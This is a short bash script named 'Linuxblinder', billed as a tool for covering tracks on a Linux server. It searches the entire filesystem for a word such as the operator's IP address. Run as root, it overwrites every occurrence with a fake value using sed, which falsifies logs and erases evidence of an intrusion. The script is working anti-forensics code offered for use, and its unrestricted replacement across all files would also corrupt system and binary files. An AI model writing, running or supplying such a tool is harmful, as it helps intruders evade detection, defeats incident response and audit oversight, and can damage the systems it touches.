#!/bin/bash

echo ""
echo "  .-.    ------------------------------------- "
echo " (o o)   | Linuxblinder [v 0.1+dev]          | "
echo " | O \   | Discover or remove your footsteps | "
echo "  \   \  | Covering Track in Linux Server    | "
echo "   '~~~' ------------------------------------- "
echo ""
echo "[1] Discover your footsteps"
echo "[2] Remove your footsteps (root needed)"
echo -ne "[ask] Select by number : "  
read SELECT
echo ""

echo "[info] Enter a word that you want to change"
echo "[info] Such as your IPv4 address or something"
echo -ne "[ask] Enter a word : "  
read WORD
echo ""

if [[ -z ${WORD} ]]; then
	echo "[error] Word could not be empty"
	exit
fi

if [[ ${SELECT} == '1' ]]; then
	echo "[running] Checking all files which contained \"${WORD}\"..."
	ALL_FILES=$(grep -Rn "${WORD}" / 2> /dev/null | awk -F ':' '{print $1}' | sort -V | uniq)
	for LOGFILE in ${ALL_FILES}
	do
		echo "[info] File ${LOGFILE} containing \"${WORD}\""
	done
	echo "[info] Done! total file is $(echo "${ALL_FILES}" | wc -l)"
	echo ""


elif [[ ${SELECT} == '2' ]]; then
	if [[ $(id -u) != "0" ]]; then
		echo "[error] You should run this script as root"
		exit
	fi
	echo "[info] Enter a fake word"
	echo "[info] Such as fake IPv4 address or something"
	echo -ne "[ask] Enter a fake word : "  
	read FAKEWORD
	echo ""
	if [[ -z ${FAKEWORD} ]]; then
		echo "[error] Fake word could not be empty"
		exit
	fi
	echo "[running] Checking all files which contained \"${WORD}\"..."
	ALL_FILES=$(grep -Rn "${WORD}" / 2> /dev/null | awk -F ':' '{print $1}' | sort -V | uniq)
	echo "[info] Done! total file is $(echo "${ALL_FILES}" | wc -l)"
	echo ""
	for LOGFILE in ${ALL_FILES}
	do
		sed -i "s/${WORD}/${FAKEWORD}/g" ${LOGFILE}
		echo "[info] ${LOGFILE} changed!"
	done
fi
